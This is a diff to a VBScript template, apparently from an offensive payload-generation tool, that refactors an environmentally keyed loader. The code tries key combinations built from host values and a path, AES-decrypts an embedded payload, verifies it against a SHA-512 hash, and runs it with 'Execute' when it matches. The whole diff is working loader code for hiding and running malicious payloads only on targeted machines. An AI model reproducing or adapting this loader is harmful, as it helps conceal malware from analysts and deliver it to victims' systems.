@@ -1,5 +1,5 @@
 ~AUTOVERSION~
-Function decryptAES(decryptMe, key)
+Function decryptAES(decryptMe, key, iv)
     dim aes, a, encBytes, encLen, decrypted, numPads
     set aes = CreateObject("System.Security.Cryptography.RijndaelManaged")
     set a = CreateObject("System.Text.ASCIIEncoding")
@@ -7,7 +7,7 @@ Function decryptAES(decryptMe, key)
     aes.Padding = 2
     aes.BlockSize = 128
     aes.KeySize = 256
-    aes.IV = decodeBase64("~AESIVBASE64~")
+    aes.IV = decodeBase64(iv)
     aes.Key = a.GetBytes_4(key)
 
     numPads = len(decryptMe) - len(replace(decryptMe, "=", ""))
@@ -38,11 +38,11 @@ function getSHA512(bytes)
     set text = CreateObject("System.Text.ASCIIEncoding")
     getSHA512 = binToHex(sha512.ComputeHash_2((text.GetBytes_4(bytes))))
 End Function
-function compareHash(decrypted, hash)
+function compareHash(decrypted, hash, minusBytes)
     dim sha512, text, newHash
     set sha512 = CreateObject("System.Security.Cryptography.SHA512Managed")
     set text = CreateObject("System.Text.ASCIIEncoding")
-    newHash = getSHA512(Mid(decrypted, 1, (len(decrypted) - ~MINUSBYTES~)))
+    newHash = getSHA512(Mid(decrypted, 1, (len(decrypted) - minusBytes)))
     If newHash = hash Then
         compareHash = True
     Else
@@ -55,9 +55,9 @@ Function tryKeyCombos(combos, path, encrypted, payloadHash)
         key = LCase(combos.Item(k) + path)
         sub_key = Mid(getSHA512(key), 1, 32)
         On Error Resume Next
-        decrypted = decryptAES(encrypted, sub_key)
+        decrypted = decryptAES(encrypted, sub_key, "~AESIVBASE64~")
         If Err.Number = 0 Then
-            If (compareHash(decrypted, payloadHash)) Then
+            If (compareHash(decrypted, payloadHash, ~MINUSBYTES~)) Then
                 Execute decrypted
                 WScript.Quit 1
             End If
